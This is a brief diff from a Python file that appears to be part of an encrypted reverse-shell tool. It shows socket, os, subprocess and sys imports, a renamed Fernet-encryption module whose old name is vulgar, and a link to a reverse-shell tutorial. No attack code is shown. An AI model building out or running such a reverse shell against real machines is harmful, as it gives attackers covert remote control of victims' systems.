@@ -2,7 +2,7 @@ import socket
 import os
 import subprocess
 import sys
-import hellobitch.cryptofernet as crypt
+import cryptofernet as crypt
 #https://www.thepythoncode.com/article/create-reverse-shell-python#:~:text=How%20to%20Create%20a%20Reverse%20Shell%20in%20Python,are%20some%20ideas%20to%20extend%20that%20code%3A%20
 
 
